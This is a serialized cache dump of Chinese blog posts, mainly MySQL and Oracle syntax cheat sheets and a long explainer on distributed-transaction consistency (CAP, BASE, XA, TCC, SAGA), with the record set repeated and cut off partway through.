[{"friendBlogCache"=["com.msc.entity.Blog",{"id":2,"title":"友情链接","firstPicture":"http://browser9.qhimg.com/bdm/1024_768_100/t0133ece91fc7ea9c18.jpg","description":"友情链接，欢迎交换！","content":"友情链接，欢迎小伙伴们交换！（每次随机排序）\n\n-  博客名称：呲哩博客\n-  博客地址：http://www.cilicili.top/ \n-  博客Logo：http://www.cilicili.top/favicon.ico \n-  博客简介：谢谢你，Cheems!","createTime":"2020-05-20 14:05:49","updateTime":"2022-11-25 17:58:58","views":34,"words":129,"typeId":1,"userId":1,"status":0}], 1=["com.baomidou.mybatisplus.extension.plugins.pagination.Page",{"records":["java.util.ArrayList",[["com.msc.entity.Blog",{"id":36,"title":"MySQL语法小结","firstPicture":"http://p9.qhimg.com/bdm/800_600_100/t011e8bedb2cd3b0a67.jpg","description":"MySQL常用语法小结","content":"# MySQL语法小结\n\n###  查看锁的情况\n```java\nSHOW STATUS LIKE 'innodb_row_lock%'; //查看锁的情况\n没有索引或者索引失效时，InnoDB 的行锁变表锁\n原因：Mysql 的行锁是通过索引实现的！\n```\n\n### 开启慢查询日志\n```java\nSET GLOBAL slow_query_log =ON;\nSHOW VARIABLES LIKE 'slow_query_log'\nSHOW VARIABLES LIKE 'long_query_time'\n```\n\n### 创建索引\n```java\nCREATE INDEX myindex ON `dp_logs`(school_id);\nALTER TABLE dp_logs ADD INDEX myindex2 (ip);\n```\n\n### 查看所有的索引\n```java\nSHOW INDEX FROM dp_logs;\n```\n\n### 表复制，连同内容结构\n```java\nCREATE TABLE dp_logs_copy LIKE dp_logs; \nINSERT INTO dp_logs_copy SELECT * FROM dp_logs;\n```\n\n### 重命名表\n```java\nALTER TABLE dp_logs_copy RENAME TO dp_logs_new ;\n```\n\n### 新加字段\n```java\nALTER TABLE dp_logs_new ADD myclo VARCHAR(32) DEFAULT NULL COMMENT \"nnn\" AFTER id;\n```\n\n### 修改字段名称或者属性\n```java\nALTER TABLE dp_logs_new CHANGE myclo myclow VARCHAR(24) DEFAULT NULL COMMENT \"32\";\nALTER TABLE dp_logs_new CHANGE myclow myclo VARCHAR(99) DEFAULT NULL COMMENT \"32\";\n```\n\n### 删除某个字段\n```java\nALTER TABLE dp_logs_new DROP myclo;\n```\n\n### 删除某个表\n```java\nDROP TABLE dp_logs_new\n```\n\n### 执行大的sql文件需要执行这个\n```java\nSET GLOBAL max_allowed_packet = 100 * 1024 * 1024;  \n```\n","createTime":"2022-11-27 16:47:47","updateTime":"2022-11-27 16:52:55","views":3,"words":1103,"typeId":10,"userId":5,"status":1}],["com.msc.entity.Blog",{"id":34,"title":"分布式事务","firstPicture":"http://browser9.qhimg.com/bdm/800_600_100/t0179b947962a684673.jpg","description":"分布式事务分布式事务分布式事务","content":"# 分布式事务\n随着业务的快速发展、业务复杂度越来越高，几乎每个公司的系统都会从单体走向分布式，特别是转向微服务架构。随之而来就必然遇到分布式事务这个难题，\n\n### 基础理论\n在讲解具体方案之前，我们先了解一下分布式事务所涉及到的基础理论知识。\n\n我们拿转账作为例子，A需要转100元给B，那么需要给A的余额-100元，给B的余额+100元，整个转账要保证，A-100和B+100同时成功，或者同时失败。看看在各种场景下，是如何解决这个问题的。\n\n### 事务\n把多条语句作为一个整体进行操作的功能，被称为数据库事务。数据库事务可以确保该事务范围内的所有操作都可以全部成功或者全部失败。\n\n事务具有 4 个属性：原子性、一致性、隔离性、持久性。这四个属性通常称为 ACID 特性。\n\n- Atomicity（原子性）：一个事务中的所有操作，要么全部完成，要么全部不完成，不会结束在中间某个环节。事务在执行过程中发生错误，会被恢复到事务开始前的状态，就像这个事务从来没有执行过一样。\n- Consistency（一致性）：在事务开始之前和事务结束以后，数据库的完整性没有被破坏。完整性包括外键约束、应用定义的等约束不会被破坏。\n- Isolation（隔离性）：数据库允许多个并发事务同时对其数据进行读写和修改的能力，隔离性可以防止多个事务并发执行时由于交叉执行而导致数据的不一致。\n- Durability（持久性）：事务处理结束后，对数据的修改就是永久的，即便系统故障也不会丢失。\n\n主流的数据库例如Mysql、Postgres等，都支持ACID事务，其内部会采用MVCC（多版本并发控制）技术，实现高性能、高并发的本地事务。MVCC技术是数据库的技术基石，非常重要，但是内容很多，这里就不再展开细说，有兴趣的同学，可以自行查找相关资料学习。\n\n### 分布式理论\n\n分布式事务涉及多个节点，是一个典型的分布式系统，与单机系统有非常大的差别。一个分布式系统最多只能同时满足一致性（Consistency）、可用性（Availability）和分区容错性（Partition tolerance）这三项中的两项，这被称为CAP理论。\n\n#### C 一致性\n分布式系统中，数据一般会存在不同节点的副本中，如果对第一个节点的数据成功进行了更新操作，而第二个节点上的数据却没有得到相应更新，这时候读取第二个节点的数据依然是更新前的数据，即脏数据，这就是分布式系统数据不一致的情况。\n\n在分布式系统中，如果能够做到针对一个数据项的更新操作执行成功后，所有的用户都能读取到最新的值，那么这样的系统就被认为具有强一致性（或严格的一致性）。\n\n请注意CAP中的一致性和ACID中的一致性，虽然单词相同，但实际含义不同，请注意区分\n\n#### A 可用性\n在集群中一部分节点故障后，集群整体是否还能响应客户端的读写请求。\n\n在现代的互联网应用中，如果因为服务器宕机等问题，导致服务长期不可用，是不可接受的\n\n#### P 分区容错性\n以实际效果而言，分区相当于对通信的时限要求。系统如果不能在时限内达成数据一致性，就意味着发生了分区的情况，必须就当前操作在 C 和 A 之间做出选择。\n\n提高分区容忍性的办法就是一个数据项复制到多个节点上，那么出现分区之后，这一数据项仍然能在其他区中读取，容忍性就提高了。然而，把数据复制到多个节点，就会带来一致性的问题，就是多个节点上面的数据可能是不一致的。\n\n\n#### 面临的问题\n对于多数大型互联网应用的场景，主机众多、部署分散，而且现在的集群规模越来越大，所以节点故障、网络故障是常态，而且要保证服务可用性达到N个9，即保证P和A，舍弃C。\n\n#### BASE理论\nBASE是Basically Available（基本可用）、Soft state（软状态）和Eventually consistent（最终一致性）三个短语的简写，BASE是对CAP中一致性和可用性权衡的结果，其来源于对大规模互联网系统分布式实践的结论，是基于CAP定理逐步演化而来的，其核心思想是即使无法做到强一致性（Strong consistency），但每个应用都可以根据自身的业务特点，采用适当的方式来使系统达到最终一致性（Eventual consistency）。接下来我们着重对BASE中的三要素进行详细讲解。\n\n- 基本可用是指分布式系统在出现不可预知故障的时候，允许损失部分可用性——但请注意，这绝不等价于系统不可用。\n- 弱状态也称为软状态，和硬状态相对，是指允许系统中的数据存在中间状态，并认为该中间状态的存在不会影响系统的整体可用性，即允许系统在不同节点的数据副本之间进行数据同步的过程存在延时。\n- 最终一致性强调的是系统中所有的数据副本，在经过一段时间的同步后，最终能够达到一个一致的状态。因此，最终一致性的本质是需要系统保证最终数据能够达到一致，而不需要实时保证系统数据的强一致性\n\n总的来说，BASE理论面向的是大型高可用可扩展的分布式系统，提出通过牺牲强一致性来获得可用性，并允许数据在一段时间内是不一致的，但最终达到一致状态。\n\n许多的NoSQL是按照BASE理论进行设计的，典型的例子包括：Dynamo、Cassandra、CouchDB。\n\n### 分布式事务\n银行跨行转账业务是一个典型分布式事务场景，假设A需要跨行转账给B，那么就涉及两个银行的数据，无法通过一个数据库的本地事务保证转账的ACID，只能够通过分布式事务来解决。\n\n分布式事务就是指事务的发起者、资源及资源管理器和事务协调者分别位于分布式系统的不同节点之上。在上述转账的业务中，用户A-100操作和用户B+100操作不是位于同一个节点上。本质上来说，分布式事务就是为了保证在分布式场景下，数据操作的正确执行。\n\n分布式事务可以分为两类：\n\n- 第一类为：NewSQL的内部分布式事务，这类事务不是我们今天讨论的重点，仅做简单叙述\n- 第二类为：跨数据库、跨服务的分布式事务，这类事务是dtm主要研究的对象，后面会详细讲解\n\n### NewSQL的分布式事务\n以Spanner、TiDB为代表的NewSQL，在内部集群多节点间，实现了ACID的事务，即提供给用户的事务接口与普通本地事务无差别，但是在内部，一个事务是支持多个节点多条数据的写入，此时无法采用本地ACID的MVCC技术，而是会采用一套复杂的分布式MVCC来做到ACID。大多数的NewSQL分布式事务技术都采用这篇论文Percolator介绍的核心技术。\n\n那么从CAP的角度看，三者不能同时兼备，那么NewSQL选择了什么，牺牲了什么呢？\n\n首先我们看C（一致性），这是数据库类的应用必须具备的。只要数据写入了，后续的读，一定能获取到最新写入的结果。你可以想象如果不是这样，那么你的应用处理关键事务如订单时，如果读到的结果不是最新的，那么你就无法确定订单的当前准确状态，就无法进行正确处理，更无从谈起ACID特性。\n\n然后我们看P（分区），只要是分布式系统，那么P就是必然有概率发生的，因此P是分布式系统必须处理，必须具备的特性。\n\n那么我们再看A（可用性），由于架构的发展，系统出现网络分区的频率可以大幅降低。另外分布式共识算法的发展，可以在较短的时间，正确的达成共识，从而从分区故障中恢复。谷歌分布式锁Chubby的公开数据显示，集群能提供99.99958％的平均可用性，一年也就130s的运行中断。这样的可用性相当高，对实际应用的影响微乎其微。\n\n也就是说随着现代工程和共识算法的发展，可以构造出满足CP的系统，同时接近于满足A，可以称之为CP+HA，这里HA代表的是非100%的A，而是很高的可用性。\n\n公开的数据显示，谷歌的Spanner支持ACID的事务特性，同时提供了高达的5个9的可用性，因此这是一个CP+HA。\n\n既然NewSQL已经达到了CP+HA，那么从CAP的角度看，前面介绍BASE中的典型Dynamo系统等，只达到了AP，他们是否就可以退出历史舞台了呢？不会！NewSQL和BASE的系统之间，性能上差异可能是巨大的，因此在实际高性能高并发应用上，BASE也是有不少的应用场景的。\n\n### 跨服务跨库的分布式事务\n\n```sql\n分布式事务\n\n虽然分布式事务分为两类，一类是前面介绍的NewSQL的分布式事务，不是DTM研究的重点，另一类是DTM重点研究的跨服务跨库分布式事务，为了简化描述，本教程如果无特殊说明，关键词：分布式事务指的是跨库跨服务更新数据的分布式事务\n```\n\ndtm主要研究跨服务，跨数据库的分布式事务，这类分布式事务只是部分遵循 ACID 规范的：\n\n- 原子性：严格遵循\n- 一致性：事务完成后的一致性严格遵循；事务中的一致性可适当放宽\n- 隔离性：并行事务间不可影响；事务中间结果可见性允许安全放宽\n- 持久性：严格遵循\n\n这里面一致性和隔离性都没有严格遵守，但是ACID这四个特性中，AID这三个特性其实是数据库实现的人非常关心，而对于使用数据库的人，最终的用户，最关心的则是C，即用户视角看，分布式事务的一致性是什么样的？\n\n对于这里面的C（一致性），我们以一个非常具体的业务例子，来进行解释。假如我们正在处理一个转账业务，假设是A转给B 30元，在本地事务的支持下，我们的用户看到A+B的总金额，在整个转账前后，以及转账过程中，都是保持不变的。那么这个时候用户认为他看到的数据是一致的，符合业务约束的。\n\n当我们业务变复杂，引入多个数据库和大量微服务时，上述本地事务的一致性，依旧是业务非常关心。假如一个业务更新操作，跨库或者跨服务时，那么此时业务关心的一致性问题，就变成了 分布式事务中的一致性问题。\n\n在单机本地事务中，A+B的总金额在任何时刻去查（以常见的ReadCommitted或ReadRepeatable隔离级别），都是不变的，也就是业务约束一直都保持的这种一致性，我们称之为强一致性。\n\n\n\n### 无法强一致\n\n目前在跨库、跨服务的分布式实际应用中，尚未看到有强一致性的方案。\n\n我们来看看一致性级别最高的XA事务（读者如果还不了解，可以参考[XA事务](https://www.dtm.pub/practice/xa.html)），是否是强一致的，我们以跨行转账（在这里，我们以跨库更新AB来模拟）作为例子来说明，下面是一个XA事务的时序图：\n\n![image-20221123190947431](https://s2.loli.net/2022/11/23/FhkA3BE1DZ2L8eo.png)\n\n\n\n在这个时序图中，我们在如图所示的时间点发起查询，就是在两个commit中间进行的查询，那么我们查到的结果数据，将是A+B+30，不等于A+B，不符合强一致的要求。\n\n> 从微服务1查到的结果为A，因为A-30这个事务未提交；从微服务2查到的结果为B+30；总和为A+B+30\n\n从理论上分析，由于是分布式系统，那么一定是无法保证两个commit同时结束，只要两个commit中间有时间差，那么无论如何我们都无法保证强一致性。\n\n\n\n### 理论上的强一致性\n\n我们接下来思考，普通XA事务不是强一致的，但假如完全不考虑性能因素，有没有可能在理论上做到强一致：\n\n我们先看看如果我们把XA事务涉及的数据库，隔离级别设定到Serializable，是否能到到强一致的效果呢？我们来看看前面的时序场景：\n\n![](https://s2.loli.net/2022/11/23/7ecvG8QzOubyCkU.png)\n\n这种情况下，查到结果等于A+B。\n\n> 此时从微服务1查到的结果为A-30，因为在串行化之下，查询会等到A-30这个事务提交才返回；从微服务2查到的结果为B+30；总和为A+B。\n\n但是又有另一些场景出现了问题，如下图所示：\n\n![xa-serial-c2.0055f9cd.png (613×475) (dtm.pub)](https://s2.loli.net/2022/11/23/YcLsn5D8RBCNO9h.png)\n\n\n\n按照图中时序查询的结果是：A+B-30，依旧是不一致。\n\n> 此时从微服务1查到的结果为A-30，因为在串行化之下，查询会等到A-30这个事务提交才返回；从微服务2查到的结果为B，因为B+30这个事务还没有开始；总和为A+B-30.\n\n深入思考这个强一致的问题之后，有一种做法可以在普通的读已提交下做到强一致，做法如下：\n\n- 对于查询，也采用XA事务，并且查询数据时，采用select for update的方式，所有数据查完之后，再xa commit\n- 具体到当前这个时序图中，要先锁A查A，然后锁B查B，最后再分别提交，否则可能出现死锁\n\n在上述策略下，我们可以看到，在时序图任何一个时间点进行查询，获得的结果都是A+B\n\n![xa-strong-c.2e524a0a.png (613×494) (dtm.pub)](https://s2.loli.net/2022/11/23/2V9U8OyHDdIosF7.png)\n\n- 在T0时间查询，那么修改一定发生在查询全部完成之后，所以查询得到结果A+B\n- 在T1，T2，T3查询，那么查询结果返回一定全部发生在修改完成之后，所以查询得到结果也是A+B\n\n很明显这种方案下的强一致，缺点非常多。互联网应用大多是读多写少，在数据库中，原先的读可以通过多版本技术，不被锁定，快速出结果，而上述这种强一致方案：\n\n- 一方面效率极低，所有有数据交集的数据库读读、读写、写写都必须串行执行。\n- 另一方面，开发人员进行数据库多个数据查询时，也可能发生死锁，要么让开发人员小心排好访问顺序，要么接受死锁。\n\n目前暂未看到实际应用中有哪些系统采用这种方式来进行强一致的跨库分布式事务。\n\n未来有没有可能借鉴NewSQL的这种方式，来实现跨库、跨微服务这类分布式事务的强一致性？理论上是可以的。\n\n- 实现跨服务但不跨库的分布式事务一致性，会相对简单一些，其中一种方式就是实现XA事务中的TMRESUME选项。我们从前面的分析中看到，XA事务的不一致，来源于分布式系统上的两个commit无法同时完成，现在已经在一个数据库，只是跨服务，那么TMRESUME可以允许我们将某个服务的xa事务继续往前操作，最终提交时，只有一个xa commit，因此避免了两个xa commit中间的不一致时间窗口，那么就是强一致的。\n- 实现跨数据库的分布式事务一致性，会困难很多，因为各个数据库的内部版本机制都不一样，想要协同非常困难。困难来自于两点：一是不同厂商之间的MVCC机制不一样，例如Spanner是TrueTime，TiDB是单点授时，还有一些是逻辑时钟，想要兼容多种MVCC非常困难。二是不同厂商难以有足够的商业利益驱动去做这样的协同。\n\n### 最终一致性\n\n从前面的分析中可以看到，在分布式事务进行的过程中，一致性是无法得到保证的，但是分布式事务完成之后，一致性是没问题的，严格遵守的。因此我们将分布式事务方案称为最终一致性方案，这个最终一致性，与CAP中的最终一致性用了同样的词语，但他们的具体含义是不一样的，在CAP中是指读取操作最终能够读取到最后一次写入的结果，在分布式事务中是指最终事务完成后，数据严格满足业务约束。\n\n既然现有的各种分布式事务方案都无法做到强一致，那么最终一致性之间是否有差别呢？我们进行了以下关于一致性强弱的分类：\n\n一致性由强到弱分别是：\n\n[XA事务](https://www.dtm.pub/practice/xa.html)>[TCC](https://www.dtm.pub/practice/tcc.html)>[二阶段消息](https://www.dtm.pub/practice/msg.html)>[SAGA](https://www.dtm.pub/practice/saga.html)\n\n他们的分类为： \n\n![c-classify.73742507.png (1794×436) (dtm.pub)](https://s2.loli.net/2022/11/23/2Sy1gMuITR8mp7j.png)\n\n- **不一致窗口短**：XA和TCC在理想的情况下，可以做到不一致的窗口时间很短\n- **不一致窗口长**：SAGA和MSG则缺少控制不一致窗口时间的方法，相对来说会更长\n- **XA**：XA虽然不是强一致，但是XA的一致性是多种分布式事务中，一致性最好的，因为他处于不一致的状态时间很短，只有一部分分支开始commit，但还没有全部commit的这个时间窗口，数据是不一致的。因为数据库的commit操作耗时，通常是10ms内，因此不一致的窗口期很短。\n- **TCC**：理论上，TCC可以用XA来实现，例如Try-Prepare，Confirm-Commit，Cancel-Rollback。但绝大多数时候，TCC会在业务层自己实现Try|Confirm|Cancel，因此Confirm操作耗时，通常高于XA中的Commit，不一致的窗口时间比XA长\n- **MSG**：二阶消息型事务在第一个操作完成后，在所有操作完成之前，这个时间窗口是不一致的，持续时长一般比前两者更久。\n- **SAGA**：SAGA的不一致窗口时长与消息接近，但是如果发生回滚，而子事务中正向操作修改的数据又会被用户看到，这部分数据就是错误数据，容易给用户带来较差的体验，因此一致性是最差的。\n\n我们这里的分类仅仅从我们关心的几个维度进行了归纳，适用于多数场景，但并不一定适用所有情况。\n\n### 小结\n\n在这里，我们介绍了分布式事务相关的理论，分析了分布式事务的最终一致性。\n\n### 参考文献\n\n[基础理论 | DTM开源项目文档](https://www.dtm.pub/practice/theory.html)","createTime":"2022-11-23 03:14:27","updateTime":"2022-11-23 03:14:27","views":6,"words":7419,"typeId":1,"userId":5,"status":1}],["com.msc.entity.Blog",{"id":35,"title":"今日无事，勾栏听曲","firstPicture":"https://s2.loli.net/2022/11/24/fWtVas4RDnTP9Bo.png","description":"今日无事，勾栏听曲","content":"# 勾栏听曲\n\n<img src=\"https://s2.loli.net/2022/11/24/EtKisepvU871ac6.png\" alt=\"QQ图片20220706001538\" style=\"zoom: 25%;\" />\n\n<img src=\"https://s2.loli.net/2022/11/24/h4fjAWHLPnuDiyq.png\" alt=\"image-20221124185242262\" style=\"zoom:33%;\" />\n\n![image-20221124190636996](https://s2.loli.net/2022/11/24/I9xfNYPeL5842Ho.png)\n\n\n\n<img src=\"https://s2.loli.net/2022/11/25/oxn1fNGhtY4HWjv.png\" alt=\"image-20221125182315064\" style=\"zoom:33%;\" />\n\n\n\n![image-20221124195412025](https://s2.loli.net/2022/11/24/SmG96jcOQhqpNJU.png)\n\nhttps://s2.loli.net/2022/11/24/6mZb8OYGtoQLWpT.jpg\n\nhttp://browser9.qhimg.com/bdm/800_600_100/t013b21a10a6929ccbc.jpg\n\n\n\n\n\n![image-20221124195651775](https://s2.loli.net/2022/11/24/fWtVas4RDnTP9Bo.png)","createTime":"2022-11-21 02:45:43","updateTime":"2022-11-25 18:23:57","views":6,"words":146,"typeId":9,"userId":5,"status":1}],["com.msc.entity.Blog",{"id":33,"title":"Oracle语法小结","firstPicture":"http://browser9.qhimg.com/bdm/800_600_100/t013a4ed4683039d101.jpg","description":"Oracle语法小结,Oracle语法小结","content":"# Oracle语法小结\n\n#### 获取id,自增\nselect get_id() from dual ;\n\n#### 插入日期在SQL中\nto_date('2022-09-29 00:00:00 ','yyyy-mm-dd HH24:MI:SS')\n\n##### 示例：\n```sql\nINSERT INTO HRP_INP_PRE_PAY\n(ID, SYSCODE, DBUSDATE, CREATE_TIME, ORG_LINE_CODE, ORG_LINE_NAME, NMNY, DEBIT_SUBJECT, DEBIT_SUBJECT_NAME, LENDER_SUBJECT, LENDER_SUBJECT_NAME)\nSELECT get_id() AS ID ,SYSCODE, DBUSDATE,to_date('2022-09-29 00:00:00 ','yyyy-mm-dd HH24:MI:SS'), ORG_LINE_CODE, ORG_LINE_NAME, DEBIT_SUBJECT, DEBIT_SUBJECT_NAME, LENDER_SUBJECT, LENDER_SUBJECT_NAME, NMNY\nFROM V_HRP_INP_PRE_PAY;\n```\n\n#### 获取当前时间\n```\n\tselect to_char(sysdate,'yyyy-mm-dd hh24:mi:ss') from dual; \n```\n\n#### Oracle数据库比较日期时间的大小\n```\n\n在今天或者今天之前作比较:\nselect * from JN_BUS_KJLWSBJBXX where dqsj < to_date('2007-09-07 00:00:00','yyyy-mm-dd hh24:mi:ss')\nselect * from JN_BUS_KJLWSBJBXX where dqsj <= to_date('2007-09-07 00:00:00','yyyy-mm-dd hh24:mi:ss')\n \n在今天或者今天之后作比较:\nselect * from JN_BUS_KJLWSBJBXX where dqsj > to_date('2007-09-07 00:00:00','yyyy-mm-dd hh24:mi:ss')\nselect * from JN_BUS_KJLWSBJBXX where dqsj >= to_date('2007-09-07 00:00:00','yyyy-mm-dd hh24:mi:ss')\n \n精确时间:\nselect * from JN_BUS_KJLWSBJBXX where dqsj = to_date('2007-09-07 00:00:00','yyyy-mm-dd hh24:mi:ss')\n \n在某段时间内的比较:\nselect * from JN_BUS_KJLWSBJBXX where dqsj between to_date('2007-07-07 00:00:00','yyyy-mm-dd hh24:mi:ss') and to_date('2007-09-07 00:00:00','yyyy-mm-dd hh24:mi:ss')\nselect * from JN_BUS_KJLWSBJBXX where dqsj < to_date('2007-09-07 00:00:00','yyyy-mm-dd hh24:mi:ss') and update > to_date('2007-07-07 00:00:00','yyyy-mm-dd hh24:mi:ss')\nselect * from JN_BUS_KJLWSBJBXX where dqsj <= to_date('2007-09-07 00:00:00','yyyy-mm-dd hh24:mi:ss') and update >= to_date('2007-07-07 00:00:00','yyyy-mm-dd hh24:mi:ss')\n \nSELECT * from ZYZB_JZ_FDMHL_ZPH where dqsj > to_date('2014-09-20','yyyy-MM-dd') --时间比较--默认时分秒为 00:00:00\nSELECT * from ZYZB_JZ_FDMHL_ZPH where dqsj > to_date('2014-09-20','yyyy-mm-dd hh24:mi:ss') --时间比较\nSELECT * from ZYZB_JZ_FDMHL_ZPH where dqsj > to_date('2014-09-20 23:59:59','yyyy-mm-dd hh24:mi:ss') --时间比较--精确时分秒\nselect * from ZYZB_JZ_FDMHL_ZPH where dqsj = to_date('2014-09-23 03:25:00','yyyy-mm-dd hh24:mi:ss')--时间比较--精确时分秒\n\n\n```","createTime":"2022-11-14 17:20:33","updateTime":"2022-11-18 17:17:54","views":19,"words":2155,"typeId":10,"userId":5,"status":1}]]],"total":26,"size":4,"current":1,"orders":["java.util.ArrayList",[]],"optimizeCountSql":true,"isSearchCount":true,"searchCount":true,"pages":7}]}, {1=["com.baomidou.mybatisplus.extension.plugins.pagination.Page",{"records":["java.util.ArrayList",[["com.msc.entity.Blog",{"id":36,"title":"MySQL语法小结","firstPicture":"http://p9.qhimg.com/bdm/800_600_100/t011e8bedb2cd3b0a67.jpg","description":"MySQL常用语法小结","content":"# MySQL语法小结\n\n###  查看锁的情况\n```java\nSHOW STATUS LIKE 'innodb_row_lock%'; //查看锁的情况\n没有索引或者索引失效时，InnoDB 的行锁变表锁\n原因：Mysql 的行锁是通过索引实现的！\n```\n\n### 开启慢查询日志\n```java\nSET GLOBAL slow_query_log =ON;\nSHOW VARIABLES LIKE 'slow_query_log'\nSHOW VARIABLES LIKE 'long_query_time'\n```\n\n### 创建索引\n```java\nCREATE INDEX myindex ON `dp_logs`(school_id);\nALTER TABLE dp_logs ADD INDEX myindex2 (ip);\n```\n\n### 查看所有的索引\n```java\nSHOW INDEX FROM dp_logs;\n```\n\n### 表复制，连同内容结构\n```java\nCREATE TABLE dp_logs_copy LIKE dp_logs; \nINSERT INTO dp_logs_copy SELECT * FROM dp_logs;\n```\n\n### 重命名表\n```java\nALTER TABLE dp_logs_copy RENAME TO dp_logs_new ;\n```\n\n### 新加字段\n```java\nALTER TABLE dp_logs_new ADD myclo VARCHAR(32) DEFAULT NULL COMMENT \"nnn\" AFTER id;\n```\n\n### 修改字段名称或者属性\n```java\nALTER TABLE dp_logs_new CHANGE myclo myclow VARCHAR(24) DEFAULT NULL COMMENT \"32\";\nALTER TABLE dp_logs_new CHANGE myclow myclo VARCHAR(99) DEFAULT NULL COMMENT \"32\";\n```\n\n### 删除某个字段\n```java\nALTER TABLE dp_logs_new DROP myclo;\n```\n\n### 删除某个表\n```java\nDROP TABLE dp_logs_new\n```\n\n### 执行大的sql文件需要执行这个\n```java\nSET GLOBAL max_allowed_packet = 100 * 1024 * 1024;  \n```\n","createTime":"2022-11-27 16:47:47","updateTime":"2022-11-27 16:52:55","views":3,"words":1103,"typeId":10,"userId":5,"status":1}],["com.msc.entity.Blog",{"id":34,"title":"分布式事务","firstPicture":"http://browser9.qhimg.com/bdm/800_600_100/t0179b947962a684673.jpg","description":"分布式事务分布式事务分布式事务","content":"# 分布式事务\n随着业务的快速发展、业务复杂度越来越高，几乎每个公司的系统都会从单体走向分布式，特别是转向微服务架构。随之而来就必然遇到分布式事务这个难题，\n\n### 基础理论\n在讲解具体方案之前，我们先了解一下分布式事务所涉及到的基础理论知识。\n\n我们拿转账作为例子，A需要转100元给B，那么需要给A的余额-100元，给B的余额+100元，整个转账要保证，A-100和B+100同时成功，或者同时失败。看看在各种场景下，是如何解决这个问题的。\n\n### 事务\n把多条语句作为一个整体进行操作的功能，被称为数据库事务。数据库事务可以确保该事务范围内的所有操作都可以全部成功或者全部失败。\n\n事务具有 4 个属性：原子性、一致性、隔离性、持久性。这四个属性通常称为 ACID 特性。\n\n- Atomicity（原子性）：一个事务中的所有操作，要么全部完成，要么全部不完成，不会结束在中间某个环节。事务在执行过程中发生错误，会被恢复到事务开始前的状态，就像这个事务从来没有执行过一样。\n- Consistency（一致性）：在事务开始之前和事务结束以后，数据库的完整性没有被破坏。完整性包括外键约束、应用定义的等约束不会被破坏。\n- Isolation（隔离性）：数据库允许多个并发事务同时对其数据进行读写和修改的能力，隔离性可以防止多个事务并发执行时由于交叉执行而导致数据的不一致。\n- Durability（持久性）：事务处理结束后，对数据的修改就是永久的，即便系统故障也不会丢失。\n\n主流的数据库例如Mysql、Postgres等，都支持ACID事务，其内部会采用MVCC（多版本并发控制）技术，实现高性能、高并发的本地事务。MVCC技术是数据库的技术基石，非常重要，但是内容很多，这里就不再展开细说，有兴趣的同学，可以自行查找相关资料学习。\n\n### 分布式理论\n\n分布式事务涉及多个节点，是一个典型的分布式系统，与单机系统有非常大的差别。一个分布式系统最多只能同时满足一致性（Consistency）、可用性（Availability）和分区容错性（Partition tolerance）这三项中的两项，这被称为CAP理论。\n\n#### C 一致性\n分布式系统中，数据一般会存在不同节点的副本中，如果对第一个节点的数据成功进行了更新操作，而第二个节点上的数据却没有得到相应更新，这时候读取第二个节点的数据依然是更新前的数据，即脏数据，这就是分布式系统数据不一致的情况。\n\n在分布式系统中，如果能够做到针对一个数据项的更新操作执行成功后，所有的用户都能读取到最新的值，那么这样的系统就被认为具有强一致性（或严格的一致性）。\n\n请注意CAP中的一致性和ACID中的一致性，虽然单词相同，但实际含义不同，请注意区分\n\n#### A 可用性\n在集群中一部分节点故障后，集群整体是否还能响应客户端的读写请求。\n\n在现代的互联网应用中，如果因为服务器宕机等问题，导致服务长期不可用，是不可接受的\n\n#### P 分区容错性\n以实际效果而言，分区相当于对通信的时限要求。系统如果不能在时限内达成数据一致性，就意味着发生了分区的情况，必须就当前操作在 C 和 A 之间做出选择。\n\n提高分区容忍性的办法就是一个数据项复制到多个节点上，那么出现分区之后，这一数据项仍然能在其他区中读取，容忍性就提高了。然而，把数据复制到多个节点，就会带来一致性的问题，就是多个节点上面的数据可能是不一致的。\n\n\n#### 面临的问题\n对于多数大型互联网应用的场景，主机众多、部署分散，而且现在的集群规模越来越大，所以节点故障、网络故障是常态，而且要保证服务可用性达到N个9，即保证P和A，舍弃C。\n\n#### BASE理论\nBASE是Basically Available（基本可用）、Soft state（软状态）和Eventually consistent（最终一致性）三个短语的简写，BASE是对CAP中一致性和可用性权衡的结果，其来源于对大规模互联网系统分布式实践的结论，是基于CAP定理逐步演化而来的，其核心思想是即使无法做到强一致性（Strong consistency），但每个应用都可以根据自身的业务特点，采用适当的方式来使系统达到最终一致性（Eventual consistency）。接下来我们着重对BASE中的三要素进行详细讲解。\n\n- 基本可用是指分布式系统在出现不可预知故障的时候，允许损失部分可用性——但请注意，这绝不等价于系统不可用。\n- 弱状态也称为软状态，和硬状态相对，是指允许系统中的数据存在中间状态，并认为该中间状态的存在不会影响系统的整体可用性，即允许系统在不同节点的数据副本之间进行数据同步的过程存在延时。\n- 最终一致性强调的是系统中所有的数据副本，在经过一段时间的同步后，最终能够达到一个一致的状态。因此，最终一致性的本质是需要系统保证最终数据能够达到一致，而不需要实时保证系统数据的强一致性\n\n总的来说，BASE理论面向的是大型高可用可扩展的分布式系统，提出通过牺牲强一致性来获得可用性，并允许数据在一段时间内是不一致的，但最终达到一致状态。\n\n许多的NoSQL是按照BASE理论进行设计的，典型的例子包括：Dynamo、Cassandra、CouchDB。\n\n### 分布式事务\n银行跨行转账业务是一个典型分布式事务场景，假设A需要跨行转账给B，那么就涉及两个银行的数据，无法通过一个数据库的本地事务保证转账的ACID，只能够通过分布式事务来解决。\n\n分布式事务就是指事务的发起者、资源及资源管理器和事务协调者分别位于分布式系统的不同节点之上。在上述转账的业务中，用户A-100操作和用户B+100操作不是位于同一个节点上。本质上来说，分布式事务就是为了保证在分布式场景下，数据操作的正确执行。\n\n分布式事务可以分为两类：\n\n- 第一类为：NewSQL的内部分布式事务，这类事务不是我们今天讨论的重点，仅做简单叙述\n- 第二类为：跨数据库、跨服务的分布式事务，这类事务是dtm主要研究的对象，后面会详细讲解\n\n### 